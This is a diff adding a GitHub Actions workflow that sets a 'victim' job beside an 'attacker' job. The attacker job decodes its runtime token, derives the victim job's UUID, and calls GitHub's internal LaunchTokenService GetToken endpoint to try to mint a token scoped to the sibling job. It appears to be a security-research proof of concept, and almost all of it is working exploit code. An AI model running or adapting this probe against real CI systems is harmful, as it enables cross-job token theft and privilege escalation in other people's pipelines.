@@ -1,0 +1,33 @@
+name: Launch GetToken sibling scope differential
+on: workflow_dispatch
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  victim:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            for(let i=0;i<12;i++){core.info(`victim heartbeat ${i}`);await new Promise(r=>setTimeout(r,10000))}
+  attacker:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const crypto=require('crypto'), token=process.env.ACTIONS_RUNTIME_TOKEN||''
+            const p=token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'), c=JSON.parse(Buffer.from(p,'base64').toString('utf8'))
+            function uuidBytes(u){return Buffer.from(u.replace(/-/g,''),'hex')}
+            function uuid5(ns,n){const h=crypto.createHash('sha1').update(Buffer.concat([uuidBytes(ns),Buffer.from(n)])).digest().subarray(0,16);h[6]=(h[6]&15)|80;h[8]=(h[8]&63)|128;const x=h.toString('hex');return `${x.slice(0,8)}-${x.slice(8,12)}-${x.slice(12,16)}-${x.slice(16,20)}-${x.slice(20)}`}
+            const victim=uuid5(c.plan_id,'victim.__default')
+            const base='https://launch.actions.githubusercontent.com/twirp/git_hub.launch.services.token.LaunchTokenService/'
+            async function post(method,body){const r=await fetch(base+method,{method:'POST',headers:{Authorization:`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify(body)});const text=await r.text();let j={};try{j=JSON.parse(text)}catch{};let tj={};if(j.token){try{const q=j.token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/');tj=JSON.parse(Buffer.from(q,'base64').toString('utf8'))}catch{}};return {status:r.status,body:text.slice(0,250),hasToken:!!j.token,job:tj.job_id||'',plan:tj.plan_id||'',scp:tj.scp||'',permissions:j.permissions||{},effective:j.effectivePermissions||{}}}
+            const rp=await post('GetRunPermissions',{planId:c.plan_id})
+            core.info(`RUNPERMS status=${rp.status} body=${rp.body}`)
+            const perms=rp.effective||rp.permissions||{}
+            const own=await post('GetToken',{workflowId:c.plan_id,jobId:c.job_id,permissions:perms,workflowRunPermissions:perms})
+            core.info(`CONTROL gettoken own status=${own.status} hasToken=${own.hasToken} jobMatch=${own.job===c.job_id} planMatch=${own.plan===c.plan_id} scp=${own.scp}`)
+            const sib=await post('GetToken',{workflowId:c.plan_id,jobId:victim,permissions:perms,workflowRunPermissions:perms})
+            core.info(`ATTACK gettoken sibling status=${sib.status} hasToken=${sib.hasToken} jobMatchVictim=${sib.job===victim} planMatch=${sib.plan===c.plan_id} body=${sib.hasToken?'[token omitted]':sib.body}`)
